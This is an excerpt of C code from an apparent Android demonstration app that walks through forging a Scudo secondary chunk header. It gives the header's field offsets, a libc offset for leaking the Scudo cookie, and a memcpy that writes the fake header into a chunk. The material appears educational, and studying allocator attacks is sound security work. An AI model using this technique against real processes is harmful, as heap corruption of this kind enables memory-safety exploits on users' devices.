...
typedef struct SecondaryChunkHeader {
    ...
    uintptr_t base;        // +0x20
    uintptr_t capacity;    // +0x28
    uintptr_t mapped_base; // +0x30
    char data;             // +0x38, empty type placeholder
    /* padding to 0x40 */
...
Java_xyz_cygnusx_forged_1commit_1base_MainActivity_run(
    ...
    LOGI("First we need to leak the scudo cookie. In this libc version it is found at libc base + 0xf7480.\n Cookie: %x\n", cookie);
    ...
    LOGI("We choose chunks of size 0x40 or larger since the size of the secondary chunk header is 0x40. This could be worked around with a chunk that is more than one chunk away.");
    ...
    memcpy(chunk1, &fake_header, sizeof(SecondaryChunkHeader));
